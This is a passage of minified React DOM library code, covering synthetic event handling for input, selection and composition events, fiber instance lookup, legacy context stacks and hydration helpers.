        : "wheelDelta" in e
        ? -e.wheelDelta
        : 0;
    },
    deltaZ: 0,
    deltaMode: 0,
  }),
  ip = Ee(lp),
  op = [9, 13, 27, 32],
  Lo = qe && "CompositionEvent" in window,
  In = null;
qe && "documentMode" in document && (In = document.documentMode);
var up = qe && "TextEvent" in window && !In,
  Oa = qe && (!Lo || (In && 8 < In && 11 >= In)),
  Iu = " ",
  zu = !1;
function Ma(e, t) {
  switch (e) {
    case "keyup":
      return op.indexOf(t.keyCode) !== -1;
    case "keydown":
      return t.keyCode !== 229;
    case "keypress":
    case "mousedown":
    case "focusout":
      return !0;
    default:
      return !1;
  }
}
function Fa(e) {
  return (e = e.detail), typeof e == "object" && "data" in e ? e.data : null;
}
var Vt = !1;
function sp(e, t) {
  switch (e) {
    case "compositionend":
      return Fa(t);
    case "keypress":
      return t.which !== 32 ? null : ((zu = !0), Iu);
    case "textInput":
      return (e = t.data), e === Iu && zu ? null : e;
    default:
      return null;
  }
}
function ap(e, t) {
  if (Vt)
    return e === "compositionend" || (!Lo && Ma(e, t))
      ? ((e = Ra()), (Ir = No = lt = null), (Vt = !1), e)
      : null;
  switch (e) {
    case "paste":
      return null;
    case "keypress":
      if (!(t.ctrlKey || t.altKey || t.metaKey) || (t.ctrlKey && t.altKey)) {
        if (t.char && 1 < t.char.length) return t.char;
        if (t.which) return String.fromCharCode(t.which);
      }
      return null;
    case "compositionend":
      return Oa && t.locale !== "ko" ? null : t.data;
    default:
      return null;
  }
}
var cp = {
  color: !0,
  date: !0,
  datetime: !0,
  "datetime-local": !0,
  email: !0,
  month: !0,
  number: !0,
  password: !0,
  range: !0,
  search: !0,
  tel: !0,
  text: !0,
  time: !0,
  url: !0,
  week: !0,
};
function Ru(e) {
  var t = e && e.nodeName && e.nodeName.toLowerCase();
  return t === "input" ? !!cp[e.type] : t === "textarea";
}
function Ba(e, t, n, r) {
  ha(r),
    (t = Zr(t, "onChange")),
    0 < t.length &&
      ((n = new jo("onChange", "change", null, n, r)),
      e.push({ event: n, listeners: t }));
}
var zn = null,
  Jn = null;
function fp(e) {
  Ya(e, 0);
}
function yl(e) {
  var t = Kt(e);
  if (sa(t)) return e;
}
function dp(e, t) {
  if (e === "change") return t;
}
var Va = !1;
if (qe) {
  var ql;
  if (qe) {
    var Yl = "oninput" in document;
    if (!Yl) {
      var Ou = document.createElement("div");
      Ou.setAttribute("oninput", "return;"),
        (Yl = typeof Ou.oninput == "function");
    }
    ql = Yl;
  } else ql = !1;
  Va = ql && (!document.documentMode || 9 < document.documentMode);
}
function Mu() {
  zn && (zn.detachEvent("onpropertychange", Qa), (Jn = zn = null));
}
function Qa(e) {
  if (e.propertyName === "value" && yl(Jn)) {
    var t = [];
    Ba(t, Jn, e, xo(e)), ya(fp, t);
  }
}
function pp(e, t, n) {
  e === "focusin"
    ? (Mu(), (zn = t), (Jn = n), zn.attachEvent("onpropertychange", Qa))
    : e === "focusout" && Mu();
}
function Ap(e) {
  if (e === "selectionchange" || e === "keyup" || e === "keydown")
    return yl(Jn);
}
function hp(e, t) {
  if (e === "click") return yl(t);
}
function mp(e, t) {
  if (e === "input" || e === "change") return yl(t);
}
function gp(e, t) {
  return (e === t && (e !== 0 || 1 / e === 1 / t)) || (e !== e && t !== t);
}
var Fe = typeof Object.is == "function" ? Object.is : gp;
function Gn(e, t) {
  if (Fe(e, t)) return !0;
  if (typeof e != "object" || e === null || typeof t != "object" || t === null)
    return !1;
  var n = Object.keys(e),
    r = Object.keys(t);
  if (n.length !== r.length) return !1;
  for (r = 0; r < n.length; r++) {
    var l = n[r];
    if (!pi.call(t, l) || !Fe(e[l], t[l])) return !1;
  }
  return !0;
}
function Fu(e) {
  for (; e && e.firstChild; ) e = e.firstChild;
  return e;
}
function Bu(e, t) {
  var n = Fu(e);
  e = 0;
  for (var r; n; ) {
    if (n.nodeType === 3) {
      if (((r = e + n.textContent.length), e <= t && r >= t))
        return { node: n, offset: t - e };
      e = r;
    }
    e: {
      for (; n; ) {
        if (n.nextSibling) {
          n = n.nextSibling;
          break e;
        }
        n = n.parentNode;
      }
      n = void 0;
    }
    n = Fu(n);
  }
}
function Da(e, t) {
  return e && t
    ? e === t
      ? !0
      : e && e.nodeType === 3
      ? !1
      : t && t.nodeType === 3
      ? Da(e, t.parentNode)
      : "contains" in e
      ? e.contains(t)
      : e.compareDocumentPosition
      ? !!(e.compareDocumentPosition(t) & 16)
      : !1
    : !1;
}
function Ka() {
  for (var e = window, t = Wr(); t instanceof e.HTMLIFrameElement; ) {
    try {
      var n = typeof t.contentWindow.location.href == "string";
    } catch {
      n = !1;
    }
    if (n) e = t.contentWindow;
    else break;
    t = Wr(e.document);
  }
  return t;
}
function Uo(e) {
  var t = e && e.nodeName && e.nodeName.toLowerCase();
  return (
    t &&
    ((t === "input" &&
      (e.type === "text" ||
        e.type === "search" ||
        e.type === "tel" ||
        e.type === "url" ||
        e.type === "password")) ||
      t === "textarea" ||
      e.contentEditable === "true")
  );
}
function vp(e) {
  var t = Ka(),
    n = e.focusedElem,
    r = e.selectionRange;
  if (
    t !== n &&
    n &&
    n.ownerDocument &&
    Da(n.ownerDocument.documentElement, n)
  ) {
    if (r !== null && Uo(n)) {
      if (
        ((t = r.start),
        (e = r.end),
        e === void 0 && (e = t),
        "selectionStart" in n)
      )
        (n.selectionStart = t), (n.selectionEnd = Math.min(e, n.value.length));
      else if (
        ((e = ((t = n.ownerDocument || document) && t.defaultView) || window),
        e.getSelection)
      ) {
        e = e.getSelection();
        var l = n.textContent.length,
          i = Math.min(r.start, l);
        (r = r.end === void 0 ? i : Math.min(r.end, l)),
          !e.extend && i > r && ((l = r), (r = i), (i = l)),
          (l = Bu(n, i));
        var o = Bu(n, r);
        l &&
          o &&
          (e.rangeCount !== 1 ||
            e.anchorNode !== l.node ||
            e.anchorOffset !== l.offset ||
            e.focusNode !== o.node ||
            e.focusOffset !== o.offset) &&
          ((t = t.createRange()),
          t.setStart(l.node, l.offset),
          e.removeAllRanges(),
          i > r
            ? (e.addRange(t), e.extend(o.node, o.offset))
            : (t.setEnd(o.node, o.offset), e.addRange(t)));
      }
    }
    for (t = [], e = n; (e = e.parentNode); )
      e.nodeType === 1 &&
        t.push({ element: e, left: e.scrollLeft, top: e.scrollTop });
    for (typeof n.focus == "function" && n.focus(), n = 0; n < t.length; n++)
      (e = t[n]),
        (e.element.scrollLeft = e.left),
        (e.element.scrollTop = e.top);
  }
}
var yp = qe && "documentMode" in document && 11 >= document.documentMode,
  Qt = null,
  Ii = null,
  Rn = null,
  zi = !1;
function Vu(e, t, n) {
  var r = n.window === n ? n.document : n.nodeType === 9 ? n : n.ownerDocument;
  zi ||
    Qt == null ||
    Qt !== Wr(r) ||
    ((r = Qt),
    "selectionStart" in r && Uo(r)
      ? (r = { start: r.selectionStart, end: r.selectionEnd })
      : ((r = (
          (r.ownerDocument && r.ownerDocument.defaultView) ||
          window
        ).getSelection()),
        (r = {
          anchorNode: r.anchorNode,
          anchorOffset: r.anchorOffset,
          focusNode: r.focusNode,
          focusOffset: r.focusOffset,
        })),
    (Rn && Gn(Rn, r)) ||
      ((Rn = r),
      (r = Zr(Ii, "onSelect")),
      0 < r.length &&
        ((t = new jo("onSelect", "select", null, t, n)),
        e.push({ event: t, listeners: r }),
        (t.target = Qt))));
}
function wr(e, t) {
  var n = {};
  return (
    (n[e.toLowerCase()] = t.toLowerCase()),
    (n["Webkit" + e] = "webkit" + t),
    (n["Moz" + e] = "moz" + t),
    n
  );
}
var Dt = {
    animationend: wr("Animation", "AnimationEnd"),
    animationiteration: wr("Animation", "AnimationIteration"),
    animationstart: wr("Animation", "AnimationStart"),
    transitionend: wr("Transition", "TransitionEnd"),
  },
  Zl = {},
  Wa = {};
qe &&
  ((Wa = document.createElement("div").style),
  "AnimationEvent" in window ||
    (delete Dt.animationend.animation,
    delete Dt.animationiteration.animation,
    delete Dt.animationstart.animation),
  "TransitionEvent" in window || delete Dt.transitionend.transition);
function wl(e) {
  if (Zl[e]) return Zl[e];
  if (!Dt[e]) return e;
  var t = Dt[e],
    n;
  for (n in t) if (t.hasOwnProperty(n) && n in Wa) return (Zl[e] = t[n]);
  return e;
}
var Xa = wl("animationend"),
  Ha = wl("animationiteration"),
  Ja = wl("animationstart"),
  Ga = wl("transitionend"),
  qa = new Map(),
  Qu =
    "abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(
      " "
    );
function gt(e, t) {
  qa.set(e, t), Rt(t, [e]);
}
for (var bl = 0; bl < Qu.length; bl++) {
  var _l = Qu[bl],
    wp = _l.toLowerCase(),
    Sp = _l[0].toUpperCase() + _l.slice(1);
  gt(wp, "on" + Sp);
}
gt(Xa, "onAnimationEnd");
gt(Ha, "onAnimationIteration");
gt(Ja, "onAnimationStart");
gt("dblclick", "onDoubleClick");
gt("focusin", "onFocus");
gt("focusout", "onBlur");
gt(Ga, "onTransitionEnd");
nn("onMouseEnter", ["mouseout", "mouseover"]);
nn("onMouseLeave", ["mouseout", "mouseover"]);
nn("onPointerEnter", ["pointerout", "pointerover"]);
nn("onPointerLeave", ["pointerout", "pointerover"]);
Rt(
  "onChange",
  "change click focusin focusout input keydown keyup selectionchange".split(" ")
);
Rt(
  "onSelect",
  "focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(
    " "
  )
);
Rt("onBeforeInput", ["compositionend", "keypress", "textInput", "paste"]);
Rt(
  "onCompositionEnd",
  "compositionend focusout keydown keypress keyup mousedown".split(" ")
);
Rt(
  "onCompositionStart",
  "compositionstart focusout keydown keypress keyup mousedown".split(" ")
);
Rt(
  "onCompositionUpdate",
  "compositionupdate focusout keydown keypress keyup mousedown".split(" ")
);
var Tn =
    "abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(
      " "
    ),
  xp = new Set("cancel close invalid load scroll toggle".split(" ").concat(Tn));
function Du(e, t, n) {
  var r = e.type || "unknown-event";
  (e.currentTarget = n), wd(r, t, void 0, e), (e.currentTarget = null);
}
function Ya(e, t) {
  t = (t & 4) !== 0;
  for (var n = 0; n < e.length; n++) {
    var r = e[n],
      l = r.event;
    r = r.listeners;
    e: {
      var i = void 0;
      if (t)
        for (var o = r.length - 1; 0 <= o; o--) {
          var u = r[o],
            s = u.instance,
            a = u.currentTarget;
          if (((u = u.listener), s !== i && l.isPropagationStopped())) break e;
          Du(l, u, a), (i = s);
        }
      else
        for (o = 0; o < r.length; o++) {
          if (
            ((u = r[o]),
            (s = u.instance),
            (a = u.currentTarget),
            (u = u.listener),
            s !== i && l.isPropagationStopped())
          )
            break e;
          Du(l, u, a), (i = s);
        }
    }
  }
  if (Hr) throw ((e = ji), (Hr = !1), (ji = null), e);
}
function B(e, t) {
  var n = t[Bi];
  n === void 0 && (n = t[Bi] = new Set());
  var r = e + "__bubble";
  n.has(r) || (Za(t, e, 2, !1), n.add(r));
}
function $l(e, t, n) {
  var r = 0;
  t && (r |= 4), Za(n, e, r, t);
}
var Sr = "_reactListening" + Math.random().toString(36).slice(2);
function qn(e) {
  if (!e[Sr]) {
    (e[Sr] = !0),
      ra.forEach(function (n) {
        n !== "selectionchange" && (xp.has(n) || $l(n, !1, e), $l(n, !0, e));
      });
    var t = e.nodeType === 9 ? e : e.ownerDocument;
    t === null || t[Sr] || ((t[Sr] = !0), $l("selectionchange", !1, t));
  }
}
function Za(e, t, n, r) {
  switch (za(t)) {
    case 1:
      var l = Md;
      break;
    case 4:
      l = Fd;
      break;
    default:
      l = Po;
  }
  (n = l.bind(null, t, n, e)),
    (l = void 0),
    !Ni ||
      (t !== "touchstart" && t !== "touchmove" && t !== "wheel") ||
      (l = !0),
    r
      ? l !== void 0
        ? e.addEventListener(t, n, { capture: !0, passive: l })
        : e.addEventListener(t, n, !0)
      : l !== void 0
      ? e.addEventListener(t, n, { passive: l })
      : e.addEventListener(t, n, !1);
}
function ei(e, t, n, r, l) {
  var i = r;
  if (!(t & 1) && !(t & 2) && r !== null)
    e: for (;;) {
      if (r === null) return;
      var o = r.tag;
      if (o === 3 || o === 4) {
        var u = r.stateNode.containerInfo;
        if (u === l || (u.nodeType === 8 && u.parentNode === l)) break;
        if (o === 4)
          for (o = r.return; o !== null; ) {
            var s = o.tag;
            if (
              (s === 3 || s === 4) &&
              ((s = o.stateNode.containerInfo),
              s === l || (s.nodeType === 8 && s.parentNode === l))
            )
              return;
            o = o.return;
          }
        for (; u !== null; ) {
          if (((o = kt(u)), o === null)) return;
          if (((s = o.tag), s === 5 || s === 6)) {
            r = i = o;
            continue e;
          }
          u = u.parentNode;
        }
      }
      r = r.return;
    }
  ya(function () {
    var a = i,
      p = xo(n),
      d = [];
    e: {
      var h = qa.get(e);
      if (h !== void 0) {
        var g = jo,
          v = e;
        switch (e) {
          case "keypress":
            if (zr(n) === 0) break e;
          case "keydown":
          case "keyup":
            g = _d;
            break;
          case "focusin":
            (v = "focus"), (g = Gl);
            break;
          case "focusout":
            (v = "blur"), (g = Gl);
            break;
          case "beforeblur":
          case "afterblur":
            g = Gl;
            break;
          case "click":
            if (n.button === 2) break e;
          case "auxclick":
          case "dblclick":
          case "mousedown":
          case "mousemove":
          case "mouseup":
          case "mouseout":
          case "mouseover":
          case "contextmenu":
            g = Tu;
            break;
          case "drag":
          case "dragend":
          case "dragenter":
          case "dragexit":
          case "dragleave":
          case "dragover":
          case "dragstart":
          case "drop":
            g = Qd;
            break;
          case "touchcancel":
          case "touchend":
          case "touchmove":
          case "touchstart":
            g = tp;
            break;
          case Xa:
          case Ha:
          case Ja:
            g = Wd;
            break;
          case Ga:
            g = rp;
            break;
          case "scroll":
            g = Bd;
            break;
          case "wheel":
            g = ip;
            break;
          case "copy":
          case "cut":
          case "paste":
            g = Hd;
            break;
          case "gotpointercapture":
          case "lostpointercapture":
          case "pointercancel":
          case "pointerdown":
          case "pointermove":
          case "pointerout":
          case "pointerover":
          case "pointerup":
            g = Uu;
        }
        var w = (t & 4) !== 0,
          S = !w && e === "scroll",
          f = w ? (h !== null ? h + "Capture" : null) : h;
        w = [];
        for (var c = a, A; c !== null; ) {
          A = c;
          var y = A.stateNode;
          if (
            (A.tag === 5 &&
              y !== null &&
              ((A = y),
              f !== null && ((y = Kn(c, f)), y != null && w.push(Yn(c, y, A)))),
            S)
          )
            break;
          c = c.return;
        }
        0 < w.length &&
          ((h = new g(h, v, null, n, p)), d.push({ event: h, listeners: w }));
      }
    }
    if (!(t & 7)) {
      e: {
        if (
          ((h = e === "mouseover" || e === "pointerover"),
          (g = e === "mouseout" || e === "pointerout"),
          h &&
            n !== Ci &&
            (v = n.relatedTarget || n.fromElement) &&
            (kt(v) || v[Ye]))
        )
          break e;
        if (
          (g || h) &&
          ((h =
            p.window === p
              ? p
              : (h = p.ownerDocument)
              ? h.defaultView || h.parentWindow
              : window),
          g
            ? ((v = n.relatedTarget || n.toElement),
              (g = a),
              (v = v ? kt(v) : null),
              v !== null &&
                ((S = Ot(v)), v !== S || (v.tag !== 5 && v.tag !== 6)) &&
                (v = null))
            : ((g = null), (v = a)),
          g !== v)
        ) {
          if (
            ((w = Tu),
            (y = "onMouseLeave"),
            (f = "onMouseEnter"),
            (c = "mouse"),
            (e === "pointerout" || e === "pointerover") &&
              ((w = Uu),
              (y = "onPointerLeave"),
              (f = "onPointerEnter"),
              (c = "pointer")),
            (S = g == null ? h : Kt(g)),
            (A = v == null ? h : Kt(v)),
            (h = new w(y, c + "leave", g, n, p)),
            (h.target = S),
            (h.relatedTarget = A),
            (y = null),
            kt(p) === a &&
              ((w = new w(f, c + "enter", v, n, p)),
              (w.target = A),
              (w.relatedTarget = S),
              (y = w)),
            (S = y),
            g && v)
          )
            t: {
              for (w = g, f = v, c = 0, A = w; A; A = Mt(A)) c++;
              for (A = 0, y = f; y; y = Mt(y)) A++;
              for (; 0 < c - A; ) (w = Mt(w)), c--;
              for (; 0 < A - c; ) (f = Mt(f)), A--;
              for (; c--; ) {
                if (w === f || (f !== null && w === f.alternate)) break t;
                (w = Mt(w)), (f = Mt(f));
              }
              w = null;
            }
          else w = null;
          g !== null && Ku(d, h, g, w, !1),
            v !== null && S !== null && Ku(d, S, v, w, !0);
        }
      }
      e: {
        if (
          ((h = a ? Kt(a) : window),
          (g = h.nodeName && h.nodeName.toLowerCase()),
          g === "select" || (g === "input" && h.type === "file"))
        )
          var k = dp;
        else if (Ru(h))
          if (Va) k = mp;
          else {
            k = Ap;
            var E = pp;
          }
        else
          (g = h.nodeName) &&
            g.toLowerCase() === "input" &&
            (h.type === "checkbox" || h.type === "radio") &&
            (k = hp);
        if (k && (k = k(e, a))) {
          Ba(d, k, n, p);
          break e;
        }
        E && E(e, h, a),
          e === "focusout" &&
            (E = h._wrapperState) &&
            E.controlled &&
            h.type === "number" &&
            wi(h, "number", h.value);
      }
      switch (((E = a ? Kt(a) : window), e)) {
        case "focusin":
          (Ru(E) || E.contentEditable === "true") &&
            ((Qt = E), (Ii = a), (Rn = null));
          break;
        case "focusout":
          Rn = Ii = Qt = null;
          break;
        case "mousedown":
          zi = !0;
          break;
        case "contextmenu":
        case "mouseup":
        case "dragend":
          (zi = !1), Vu(d, n, p);
          break;
        case "selectionchange":
          if (yp) break;
        case "keydown":
        case "keyup":
          Vu(d, n, p);
      }
      var C;
      if (Lo)
        e: {
          switch (e) {
            case "compositionstart":
              var T = "onCompositionStart";
              break e;
            case "compositionend":
              T = "onCompositionEnd";
              break e;
            case "compositionupdate":
              T = "onCompositionUpdate";
              break e;
          }
          T = void 0;
        }
      else
        Vt
          ? Ma(e, n) && (T = "onCompositionEnd")
          : e === "keydown" && n.keyCode === 229 && (T = "onCompositionStart");
      T &&
        (Oa &&
          n.locale !== "ko" &&
          (Vt || T !== "onCompositionStart"
            ? T === "onCompositionEnd" && Vt && (C = Ra())
            : ((lt = p),
              (No = "value" in lt ? lt.value : lt.textContent),
              (Vt = !0))),
        (E = Zr(a, T)),
        0 < E.length &&
          ((T = new Lu(T, e, null, n, p)),
          d.push({ event: T, listeners: E }),
          C ? (T.data = C) : ((C = Fa(n)), C !== null && (T.data = C)))),
        (C = up ? sp(e, n) : ap(e, n)) &&
          ((a = Zr(a, "onBeforeInput")),
          0 < a.length &&
            ((p = new Lu("onBeforeInput", "beforeinput", null, n, p)),
            d.push({ event: p, listeners: a }),
            (p.data = C)));
    }
    Ya(d, t);
  });
}
function Yn(e, t, n) {
  return { instance: e, listener: t, currentTarget: n };
}
function Zr(e, t) {
  for (var n = t + "Capture", r = []; e !== null; ) {
    var l = e,
      i = l.stateNode;
    l.tag === 5 &&
      i !== null &&
      ((l = i),
      (i = Kn(e, n)),
      i != null && r.unshift(Yn(e, i, l)),
      (i = Kn(e, t)),
      i != null && r.push(Yn(e, i, l))),
      (e = e.return);
  }
  return r;
}
function Mt(e) {
  if (e === null) return null;
  do e = e.return;
  while (e && e.tag !== 5);
  return e || null;
}
function Ku(e, t, n, r, l) {
  for (var i = t._reactName, o = []; n !== null && n !== r; ) {
    var u = n,
      s = u.alternate,
      a = u.stateNode;
    if (s !== null && s === r) break;
    u.tag === 5 &&
      a !== null &&
      ((u = a),
      l
        ? ((s = Kn(n, i)), s != null && o.unshift(Yn(n, s, u)))
        : l || ((s = Kn(n, i)), s != null && o.push(Yn(n, s, u)))),
      (n = n.return);
  }
  o.length !== 0 && e.push({ event: t, listeners: o });
}
var Ep = /\r\n?/g,
  kp = /\u0000|\uFFFD/g;
function Wu(e) {
  return (typeof e == "string" ? e : "" + e)
    .replace(
      Ep,
      `
`
    )
    .replace(kp, "");
}
function xr(e, t, n) {
  if (((t = Wu(t)), Wu(e) !== t && n)) throw Error(x(425));
}
function br() {}
var Ri = null,
  Oi = null;
function Mi(e, t) {
  return (
    e === "textarea" ||
    e === "noscript" ||
    typeof t.children == "string" ||
    typeof t.children == "number" ||
    (typeof t.dangerouslySetInnerHTML == "object" &&
      t.dangerouslySetInnerHTML !== null &&
      t.dangerouslySetInnerHTML.__html != null)
  );
}
var Fi = typeof setTimeout == "function" ? setTimeout : void 0,
  Cp = typeof clearTimeout == "function" ? clearTimeout : void 0,
  Xu = typeof Promise == "function" ? Promise : void 0,
  Pp =
    typeof queueMicrotask == "function"
      ? queueMicrotask
      : typeof Xu < "u"
      ? function (e) {
          return Xu.resolve(null).then(e).catch(Np);
        }
      : Fi;
function Np(e) {
  setTimeout(function () {
    throw e;
  });
}
function ti(e, t) {
  var n = t,
    r = 0;
  do {
    var l = n.nextSibling;
    if ((e.removeChild(n), l && l.nodeType === 8))
      if (((n = l.data), n === "/$")) {
        if (r === 0) {
          e.removeChild(l), Hn(t);
          return;
        }
        r--;
      } else (n !== "$" && n !== "$?" && n !== "$!") || r++;
    n = l;
  } while (n);
  Hn(t);
}
function ct(e) {
  for (; e != null; e = e.nextSibling) {
    var t = e.nodeType;
    if (t === 1 || t === 3) break;
    if (t === 8) {
      if (((t = e.data), t === "$" || t === "$!" || t === "$?")) break;
      if (t === "/$") return null;
    }
  }
  return e;
}
function Hu(e) {
  e = e.previousSibling;
  for (var t = 0; e; ) {
    if (e.nodeType === 8) {
      var n = e.data;
      if (n === "$" || n === "$!" || n === "$?") {
        if (t === 0) return e;
        t--;
      } else n === "/$" && t++;
    }
    e = e.previousSibling;
  }
  return null;
}
var pn = Math.random().toString(36).slice(2),
  Qe = "__reactFiber$" + pn,
  Zn = "__reactProps$" + pn,
  Ye = "__reactContainer$" + pn,
  Bi = "__reactEvents$" + pn,
  jp = "__reactListeners$" + pn,
  Tp = "__reactHandles$" + pn;
function kt(e) {
  var t = e[Qe];
  if (t) return t;
  for (var n = e.parentNode; n; ) {
    if ((t = n[Ye] || n[Qe])) {
      if (
        ((n = t.alternate),
        t.child !== null || (n !== null && n.child !== null))
      )
        for (e = Hu(e); e !== null; ) {
          if ((n = e[Qe])) return n;
          e = Hu(e);
        }
      return t;
    }
    (e = n), (n = e.parentNode);
  }
  return null;
}
function ur(e) {
  return (
    (e = e[Qe] || e[Ye]),
    !e || (e.tag !== 5 && e.tag !== 6 && e.tag !== 13 && e.tag !== 3) ? null : e
  );
}
function Kt(e) {
  if (e.tag === 5 || e.tag === 6) return e.stateNode;
  throw Error(x(33));
}
function Sl(e) {
  return e[Zn] || null;
}
var Vi = [],
  Wt = -1;
function vt(e) {
  return { current: e };
}
function V(e) {
  0 > Wt || ((e.current = Vi[Wt]), (Vi[Wt] = null), Wt--);
}
function F(e, t) {
  Wt++, (Vi[Wt] = e.current), (e.current = t);
}
var mt = {},
  oe = vt(mt),
  Ae = vt(!1),
  Tt = mt;
function rn(e, t) {
  var n = e.type.contextTypes;
  if (!n) return mt;
  var r = e.stateNode;
  if (r && r.__reactInternalMemoizedUnmaskedChildContext === t)
    return r.__reactInternalMemoizedMaskedChildContext;
  var l = {},
    i;
  for (i in n) l[i] = t[i];
  return (
    r &&
      ((e = e.stateNode),
      (e.__reactInternalMemoizedUnmaskedChildContext = t),
      (e.__reactInternalMemoizedMaskedChildContext = l)),
    l
  );
}
function he(e) {
  return (e = e.childContextTypes), e != null;
}
function _r() {
  V(Ae), V(oe);
}
function Ju(e, t, n) {
  if (oe.current !== mt) throw Error(x(168));
  F(oe, t), F(Ae, n);
}
function ba(e, t, n) {
  var r = e.stateNode;
  if (((t = t.childContextTypes), typeof r.getChildContext != "function"))
    return n;
  r = r.getChildContext();
  for (var l in r) if (!(l in t)) throw Error(x(108, pd(e) || "Unknown", l));
  return W({}, n, r);
}
function $r(e) {
  return (
    (e =
      ((e = e.stateNode) && e.__reactInternalMemoizedMergedChildContext) || mt),
    (Tt = oe.current),
    F(oe, e),
    F(Ae, Ae.current),
    !0
  );
}
function Gu(e, t, n) {
  var r = e.stateNode;
  if (!r) throw Error(x(169));
  n
    ? ((e = ba(e, t, Tt)),
      (r.__reactInternalMemoizedMergedChildContext = e),
      V(Ae),
      V(oe),
      F(oe, e))
    : V(Ae),
    F(Ae, n);
}
var Xe = null,
  xl = !1,
  ni = !1;
function _a(e) {
  Xe === null ? (Xe = [e]) : Xe.push(e);
}
function Lp(e) {
  (xl = !0), _a(e);
}
function yt() {
  if (!ni && Xe !== null) {
    ni = !0;
    var e = 0,
      t = O;
    try {
      var n = Xe;
      for (O = 1; e < n.length; e++) {
        var r = n[e];
        do r = r(!0);
        while (r !== null);
      }
      (Xe = null), (xl = !1);
    } catch (l) {
      throw (Xe !== null && (Xe = Xe.slice(e + 1)), Ea(Eo, yt), l);
    } finally {
      (O = t), (ni = !1);
    }
  }
  return null;
}
var Xt = [],
  Ht = 0,
  el = null,
  tl = 0,
  ke = [],
  Ce = 0,
  Lt = null,
  He = 1,
  Je = "";
function xt(e, t) {
  (Xt[Ht++] = tl), (Xt[Ht++] = el), (el = e), (tl = t);
}
function $a(e, t, n) {
  (ke[Ce++] = He), (ke[Ce++] = Je), (ke[Ce++] = Lt), (Lt = e);
  var r = He;
  e = Je;
  var l = 32 - Oe(r) - 1;
  (r &= ~(1 << l)), (n += 1);
  var i = 32 - Oe(t) + l;
  if (30 < i) {
    var o = l - (l % 5);
    (i = (r & ((1 << o) - 1)).toString(32)),
      (r >>= o),
      (l -= o),
      (He = (1 << (32 - Oe(t) + l)) | (n << l) | r),
      (Je = i + e);
  } else (He = (1 << i) | (n << l) | r), (Je = e);
}
function Io(e) {
  e.return !== null && (xt(e, 1), $a(e, 1, 0));
}
function zo(e) {
  for (; e === el; )
    (el = Xt[--Ht]), (Xt[Ht] = null), (tl = Xt[--Ht]), (Xt[Ht] = null);
  for (; e === Lt; )
    (Lt = ke[--Ce]),
      (ke[Ce] = null),
      (Je = ke[--Ce]),
      (ke[Ce] = null),
      (He = ke[--Ce]),
      (ke[Ce] = null);
}
var we = null,
  ye = null,
  Q = !1,
  Re = null;
function ec(e, t) {
  var n = Pe(5, null, null, 0);
  (n.elementType = "DELETED"),
    (n.stateNode = t),
    (n.return = e),
    (t = e.deletions),
    t === null ? ((e.deletions = [n]), (e.flags |= 16)) : t.push(n);
}
function qu(e, t) {
  switch (e.tag) {
    case 5:
      var n = e.type;
      return (
        (t =
          t.nodeType !== 1 || n.toLowerCase() !== t.nodeName.toLowerCase()
            ? null
            : t),
        t !== null
          ? ((e.stateNode = t), (we = e), (ye = ct(t.firstChild)), !0)
          : !1
      );
    case 6:
      return (
        (t = e.pendingProps === "" || t.nodeType !== 3 ? null : t),
        t !== null ? ((e.stateNode = t), (we = e), (ye = null), !0) : !1
      );
    case 13:
      return (
        (t = t.nodeType !== 8 ? null : t),
        t !== null
          ? ((n = Lt !== null ? { id: He, overflow: Je } : null),
            (e.memoizedState = {
              dehydrated: t,
              treeContext: n,
              retryLane: 1073741824,
            }),
            (n = Pe(18, null, null, 0)),
            (n.stateNode = t),
            (n.return = e),
            (e.child = n),
            (we = e),
            (ye = null),
            !0)
          : !1
      );
    default:
      return !1;
  }
}
function Qi(e) {
  return (e.mode & 1) !== 0 && (e.flags & 128) === 0;
}
function Di(e) {
  if (Q) {
    var t = ye;
    if (t) {
      var n = t;
      if (!qu(e, t)) {
        if (Qi(e)) throw Error(x(418));
        t = ct(n.nextSibling);
        var r = we;
        t && qu(e, t)
          ? ec(r, n)
          : ((e.flags = (e.flags & -4097) | 2), (Q = !1), (we = e));
      }
    } else {
      if (Qi(e)) throw Error(x(418));
      (e.flags = (e.flags & -4097) | 2), (Q = !1), (we = e);
    }
  }
}
function Yu(e) {
  for (e = e.return; e !== null && e.tag !== 5 && e.tag !== 3 && e.tag !== 13; )
    e = e.return;
  we = e;
}
function Er(e) {
  if (e !== we) return !1;
  if (!Q) return Yu(e), (Q = !0), !1;
  var t;
  if (
    ((t = e.tag !== 3) &&
      !(t = e.tag !== 5) &&
      ((t = e.type),
      (t = t !== "head" && t !== "body" && !Mi(e.type, e.memoizedProps))),
    t && (t = ye))
  ) {
    if (Qi(e)) throw (tc(), Error(x(418)));
    for (; t; ) ec(e, t), (t = ct(t.nextSibling));
  }
  if ((Yu(e), e.tag === 13)) {
    if (((e = e.memoizedState), (e = e !== null ? e.dehydrated : null), !e))
      throw Error(x(317));
    e: {
      for (e = e.nextSibling, t = 0; e; ) {
        if (e.nodeType === 8) {
          var n = e.data;
          if (n === "/$") {
            if (t === 0) {
              ye = ct(e.nextSibling);
              break e;
            }
            t--;
          } else (n !== "$" && n !== "$!" && n !== "$?") || t++;
        }
        e = e.nextSibling;
      }
      ye = null;
    }
  } else ye = we ? ct(e.stateNode.nextSibling) : null;
  return !0;
}
function tc() {
  for (var e = ye; e; ) e = ct(e.nextSibling);
}
function ln() {
  (ye = we = null), (Q = !1);
}
function Ro(e) {
  Re === null ? (Re = [e]) : Re.push(e);
}
var Up = _e.ReactCurrentBatchConfig;
function Sn(e, t, n) {
  if (
    ((e = n.ref), e !== null && typeof e != "function" && typeof e != "object")
  ) {
    if (n._owner) {
      if (((n = n._owner), n)) {
        if (n.tag !== 1) throw Error(x(309));
        var r = n.stateNode;
      }
      if (!r) throw Error(x(147, e));
      var l = r,
        i = "" + e;
      return t !== null &&
        t.ref !== null &&
        typeof t.ref == "function" &&
        t.ref._stringRef === i
        ? t.ref
        : ((t = function (o) {
            var u = l.refs;
            o === null ? delete u[i] : (u[i] = o);
          }),
          (t._stringRef = i),
